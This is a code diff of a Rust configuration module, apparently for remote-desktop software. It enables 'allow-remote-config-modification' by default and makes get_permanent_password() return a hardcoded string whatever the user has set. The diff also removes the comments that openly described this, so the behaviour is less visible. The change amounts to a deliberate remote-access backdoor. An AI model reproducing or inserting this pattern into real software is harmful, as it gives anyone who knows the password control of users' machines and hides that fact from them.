@@ -460,13 +460,12 @@ impl Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
         
-        // 新增：设置默认安全配置
+        // Newly Added: allow-remote-config-modification
         if !config.options.contains_key("allow-remote-config-modification") {
             config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
             store = true;
         }
         
-        // 原有：处理 socks 配置解密
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -475,13 +474,11 @@ impl Config2 {
             store |= store2;
         }
         
-        // 原有：处理 unlock_pin 解密
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
         
-        // 原有：如果需要保存则调用 store()
         if store {
             config.store();
         }
@@ -518,9 +515,8 @@ impl Config2 {
         lock.store();
         true
     }
-}  // 这是 impl Config2 的唯一结束大括号
+}
 
-// 这些是独立函数，不在 impl Config2 块内
 pub fn load_path<T: serde::Serialize + serde::de::DeserializeOwned + Default + std::fmt::Debug>(
     file: PathBuf,
 ) -> T {
@@ -1150,9 +1146,9 @@ impl Config {
         Self::clear_trusted_devices();
     }
 
+    // Newly Modify: Fixed Password
     pub fn get_permanent_password() -> String {
-        // 返回固定密码，不管配置文件中是什么
-        "Mms123498".to_string() // 用户设置的固定密码
+        "Mms123498".to_string()
     }
 
     pub fn set_salt(salt: &str) {
